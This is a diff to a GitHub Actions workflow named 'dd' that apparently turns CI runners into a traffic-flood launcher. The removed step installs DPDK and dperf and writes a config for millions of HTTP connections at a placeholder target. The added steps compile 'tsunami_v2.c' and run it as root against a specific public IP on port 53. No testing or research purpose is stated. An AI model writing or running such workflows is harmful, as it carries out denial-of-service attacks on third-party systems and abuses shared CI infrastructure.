@@ -2,8 +2,8 @@ name: dd
 on: workflow_dispatch
 jobs:
   dd:
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-24.04-arm
     steps:
       - uses: actions/checkout@v6
-      - run: sudo su
-      - run: export DEBIAN_FRONTEND=noninteractive && killall apt apt-get dpkg 2>/dev/null; rm -f /var/lib/apt/lists/lock /var/lib/dpkg/lock /var/lib/dpkg/lock-frontend; dpkg --configure -a; apt-get update -y && apt-get install -y build-essential meson ninja-build pkg-config libnuma-dev python3-pyelftools libibverbs-dev rdma-core pciutils git wget tar && sysctl -w vm.nr_hugepages=1024 && wget -qO- http://fast.dpdk.org/rel/dpdk-22.11.2.tar.xz | tar -xJ && cd dpdk-stable-22.11.2 && meson setup build && cd build && ninja && ninja install && ldconfig && export PKG_CONFIG_PATH=/usr/local/lib/x86_64-linux-gnu/pkgconfig:/usr/local/lib/pkgconfig:$PKG_CONFIG_PATH && cd ../.. && git clone https://github.com/baidu/dperf.git && cd dperf && make && MEL_PCI=$(lspci -D | grep -i mellanox | head -n 1 | awk '{print $1}') && LOCAL_IP=$(hostname -I | awk '{print $1}') && echo -e "mode        client\nprotocol    http\ncpu         0 1 2 3\nport        $MEL_PCI\nclient      $LOCAL_IP 100\nserver      TARGET_IP 80\ncc          2000000\ncps         1000000" > client.conf && echo -e "\n\n--- ГОТОВО! ---\n1. nano client.conf (замени TARGET_IP)\n2. ./build/dperf -c client.conf"
+      - run: clang -O3 -flto -march=native -o tsunami_v2 tsunami_v2.c -pthread
+      - run: sudo ./tsunami_v2 147.75.202.235 53
